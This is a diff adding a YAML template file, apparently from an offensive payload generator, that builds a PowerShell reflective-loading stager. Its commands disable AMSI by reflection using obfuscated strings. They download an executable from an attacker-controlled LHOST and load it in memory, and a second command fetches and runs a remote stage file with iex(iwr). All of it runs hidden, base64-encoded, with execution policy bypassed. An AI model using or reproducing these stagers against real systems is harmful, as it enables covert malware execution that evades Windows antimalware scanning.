@@ -1,0 +1,31 @@
+description: "Powershell command for reflective loading"
+variables:
+  outputdir: "output"
+  beaconFile: "loader.exe"
+  stageFile: "ps-reflection-stager.txt"
+  port: 80
+templates:
+  stageTemplate:
+    # Add / remove an amsi bypass if needed, amsi.fail etc
+    variables:
+      command: "$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true); $data=(New-Object System.Net.WebClient).DownloadData('http://{{LHOST}}:{{port}}/{{beaconFile}}');$assem=[System.Reflection.Assembly]::Load($data);$entry=$assem.EntryPoint; $entry.Invoke($null, (, @()))"
+    # -ep bypass -Sta -Nop -Window Hidden
+    testTemplate: |-
+      powershell -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}
+    template: |-
+      &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}
+  powershell:
+    variables:
+      command: "iex(iwr -UseBasicParsing http://{{LHOST}}:{{LPORT}}/{{stageFile}})"
+    template: powershell.exe -ep bypass -Sta -Nop -Window Hidden -e {{ Encoder.base64(command,Encoder.utf16le) }}
+print:
+- "Powershell command for reflective loading is as follows:"
+- "{{Templates.get('powershell')}}"
+setupCommands:
+- "mkdir -p {{outputdir}}"
+- "rm -rf {{outputdir}}/{{stageFile}}"
+commands:
+- |-
+  cat << EOF >{{outputdir}}/{{stageFile}}
+  {{Templates.get('stageTemplate')}}
+  EOF
